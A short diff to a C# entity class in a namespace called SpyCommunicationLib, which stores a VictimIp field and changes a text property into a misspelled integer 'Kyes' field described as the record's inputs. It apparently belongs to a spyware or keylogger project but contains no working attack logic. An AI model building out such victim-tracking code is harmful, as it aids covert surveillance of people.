@@ -17,9 +17,9 @@ namespace SpyCommunicationLib.Entities
         public string VictimIp { get; set; }
 
         /// <summary>
-        /// Gets or sets the content or message text of the record.
+        /// Gets or sets the inputs of record.
         /// </summary>
-        public string Text { get; set; }
+        public int Kyes { get; set; }
 
         /// <summary>
         /// Gets or sets the date and time when the record was created.
